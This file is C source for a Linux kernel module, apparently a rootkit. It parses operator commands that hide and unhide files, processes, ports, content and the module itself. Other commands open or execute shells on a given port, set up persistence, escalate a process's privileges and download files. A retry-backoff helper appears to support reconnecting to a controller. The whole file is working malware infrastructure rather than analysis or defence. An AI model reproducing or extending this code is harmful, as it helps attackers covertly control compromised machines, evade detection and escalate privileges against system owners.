// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/string.h>

#include "protocol.h"

static bool rk_bytes_equal(const unsigned char *bytes, size_t length,
			   const char *text, size_t text_length)
{
	return length == text_length && !memcmp(bytes, text, text_length);
}

static int rk_parse_u16(const unsigned char *bytes, size_t length, u16 *value)
{
	unsigned int v = 0;
	size_t i;

	if (!length || length > 5 || bytes[0] == '0')
		return -EINVAL;
	for (i = 0; i < length; i++) {
		if (bytes[i] < '0' || bytes[i] > '9')
			return -EINVAL;
		v = v * 10 + bytes[i] - '0';
		if (v > 65535)
			return -EINVAL;
	}
	*value = (u16)v;
	return 0;
}

static int rk_parse_uint(const unsigned char *bytes, size_t length,
			 unsigned int *value)
{
	unsigned int v = 0;
	size_t i;

	if (!length || length > 10)
		return -EINVAL;
	for (i = 0; i < length; i++) {
		if (bytes[i] < '0' || bytes[i] > '9')
			return -EINVAL;
		if (v > 429496729 || (v == 429496729 && bytes[i] > '5'))
			return -ERANGE;
		v = v * 10 + bytes[i] - '0';
	}
	*value = v;
	return 0;
}

static int rk_parse_hide_value(const unsigned char *bytes, size_t length,
			       char *out, size_t out_size, size_t *out_length)
{
	if (!length || length >= out_size)
		return -EINVAL;
	memcpy(out, bytes, length);
	out[length] = '\0';
	*out_length = length;
	return 0;
}

static int rk_try_hide(const unsigned char *bytes, size_t length,
			struct rk_command *cmd)
{
	if (length > 10 && !memcmp(bytes, "HIDE FILE ", 10)) {
		cmd->kind = RK_COMMAND_HIDE_FILE;
		return rk_parse_hide_value(bytes + 10, length - 10,
					   cmd->hide_value,
					   sizeof(cmd->hide_value),
					   &cmd->hide_value_length);
	}
	if (length > 9 && !memcmp(bytes, "HIDE PID ", 9)) {
		cmd->kind = RK_COMMAND_HIDE_PID;
		return rk_parse_hide_value(bytes + 9, length - 9,
					   cmd->hide_value,
					   sizeof(cmd->hide_value),
					   &cmd->hide_value_length);
	}
	if (length > 13 && !memcmp(bytes, "HIDE CONTENT ", 13)) {
		cmd->kind = RK_COMMAND_HIDE_CONTENT;
		return rk_parse_hide_value(bytes + 13, length - 13,
					   cmd->hide_value,
					   sizeof(cmd->hide_value),
					   &cmd->hide_value_length);
	}
	if (length > 10 && !memcmp(bytes, "HIDE PORT ", 10)) {
		cmd->kind = RK_COMMAND_HIDE_PORT;
		return rk_parse_hide_value(bytes + 10, length - 10,
					   cmd->hide_value,
					   sizeof(cmd->hide_value),
					   &cmd->hide_value_length);
	}
	if (rk_bytes_equal(bytes, length, "HIDE MODULE", 11)) {
		cmd->kind = RK_COMMAND_HIDE_MODULE;
		return 0;
	}
	return -EINVAL;
}

static int rk_try_unhide(const unsigned char *bytes, size_t length,
			  struct rk_command *cmd)
{
	if (rk_bytes_equal(bytes, length, "UNHIDE ALL", 10)) {
		cmd->kind = RK_COMMAND_UNHIDE_ALL;
		return 0;
	}
	if (length > 12 && !memcmp(bytes, "UNHIDE FILE ", 12)) {
		cmd->kind = RK_COMMAND_UNHIDE_FILE;
		return rk_parse_uint(bytes + 12, length - 12,
				     &cmd->unhide_index);
	}
	if (length > 11 && !memcmp(bytes, "UNHIDE PID ", 11)) {
		cmd->kind = RK_COMMAND_UNHIDE_PID;
		return rk_parse_uint(bytes + 11, length - 11,
				     &cmd->unhide_index);
	}
	if (length > 15 && !memcmp(bytes, "UNHIDE CONTENT ", 15)) {
		cmd->kind = RK_COMMAND_UNHIDE_CONTENT;
		return rk_parse_uint(bytes + 15, length - 15,
				     &cmd->unhide_index);
	}
	if (length > 12 && !memcmp(bytes, "UNHIDE PORT ", 12)) {
		cmd->kind = RK_COMMAND_UNHIDE_PORT;
		return rk_parse_uint(bytes + 12, length - 12,
				     &cmd->unhide_index);
	}
	if (rk_bytes_equal(bytes, length, "UNHIDE MODULE", 13)) {
		cmd->kind = RK_COMMAND_UNHIDE_MODULE;
		return 0;
	}
	return -EINVAL;
}

static int rk_try_list_with_index(const unsigned char *bytes, size_t length,
				   size_t prefix_len, enum rk_command_kind kind,
				   struct rk_command *cmd)
{
	cmd->kind = kind;
	if (length == prefix_len) {
		cmd->list_has_index = 0;
		return 0;
	}
	if (length > prefix_len + 1 && bytes[prefix_len] == ' ') {
		cmd->list_has_index = 1;
		return rk_parse_uint(bytes + prefix_len + 1,
				     length - prefix_len - 1,
				     &cmd->list_index);
	}
	return -EINVAL;
}

static int rk_try_list(const unsigned char *bytes, size_t length,
			struct rk_command *cmd)
{
	if (length >= 9 && !memcmp(bytes, "LIST FILE", 9))
		return rk_try_list_with_index(bytes, length, 9,
					      RK_COMMAND_LIST_FILE, cmd);
	if (length >= 8 && !memcmp(bytes, "LIST PID", 8))
		return rk_try_list_with_index(bytes, length, 8,
					      RK_COMMAND_LIST_PID, cmd);
	if (length >= 12 && !memcmp(bytes, "LIST CONTENT", 12))
		return rk_try_list_with_index(bytes, length, 12,
					      RK_COMMAND_LIST_CONTENT, cmd);
	if (length >= 9 && !memcmp(bytes, "LIST PORT", 9))
		return rk_try_list_with_index(bytes, length, 9,
					      RK_COMMAND_LIST_PORT, cmd);
	return -EINVAL;
}

int rk_command_parse(const unsigned char *bytes, size_t length,
		     struct rk_command *command)
{
	struct rk_command parsed = { .kind = RK_COMMAND_INVALID };

	if (!bytes || !command)
		return -EINVAL;

	if (rk_bytes_equal(bytes, length, "INFO", 4))
		parsed.kind = RK_COMMAND_INFO;
	else if (rk_bytes_equal(bytes, length, "STATUS", 6))
		parsed.kind = RK_COMMAND_STATUS;
	else if (rk_bytes_equal(bytes, length, "SHELL STATUS", 12))
		parsed.kind = RK_COMMAND_SHELL_STATUS;
	else if (length > 6 && length <= 11 && !memcmp(bytes, "SHELL ", 6)) {
		if (rk_parse_u16(bytes + 6, length - 6, &parsed.shell_port))
			return -EINVAL;
		parsed.kind = RK_COMMAND_SHELL;
	} else if (length > 11 && length <= 16 &&
		   !memcmp(bytes, "EXEC_SHELL ", 11)) {
		if (rk_parse_u16(bytes + 11, length - 11, &parsed.shell_port))
			return -EINVAL;
		parsed.kind = RK_COMMAND_EXEC_SHELL;
	} else if (rk_bytes_equal(bytes, length, "QUIT", 4))
		parsed.kind = RK_COMMAND_QUIT;
	else if (rk_bytes_equal(bytes, length, "PERSIST", 7))
		parsed.kind = RK_COMMAND_PERSIST;
	else if (rk_bytes_equal(bytes, length, "UNPERSIST", 9))
		parsed.kind = RK_COMMAND_UNPERSIST;
	else if (length > 9 && !memcmp(bytes, "ESCALATE ", 9)) {
		if (rk_parse_uint(bytes + 9, length - 9,
				  &parsed.escalate_pid))
			return -EINVAL;
		parsed.kind = RK_COMMAND_ESCALATE;
	} else if (length > 9 && !memcmp(bytes, "DOWNLOAD ", 9)) {
		parsed.kind = RK_COMMAND_DOWNLOAD;
		if (rk_parse_hide_value(bytes + 9, length - 9,
					parsed.hide_value,
					sizeof(parsed.hide_value),
					&parsed.hide_value_length))
			return -EINVAL;
	} else if (length >= 5 && !memcmp(bytes, "HIDE ", 5)) {
		if (rk_try_hide(bytes, length, &parsed))
			return -EINVAL;
	} else if (length >= 7 && !memcmp(bytes, "UNHIDE ", 7)) {
		if (rk_try_unhide(bytes, length, &parsed))
			return -EINVAL;
	} else if (length >= 5 && !memcmp(bytes, "LIST ", 5)) {
		if (rk_try_list(bytes, length, &parsed))
			return -EINVAL;
	} else
		return -EINVAL;

	*command = parsed;
	return 0;
}

unsigned int rk_retry_next(unsigned int current_ms, unsigned int base_ms,
			   unsigned int maximum_ms)
{
	if (!base_ms || base_ms > maximum_ms)
		return 0;
	if (current_ms < base_ms)
		return base_ms;
	if (current_ms >= maximum_ms || current_ms > maximum_ms / 2)
		return maximum_ms;
	return current_ms * 2;
}
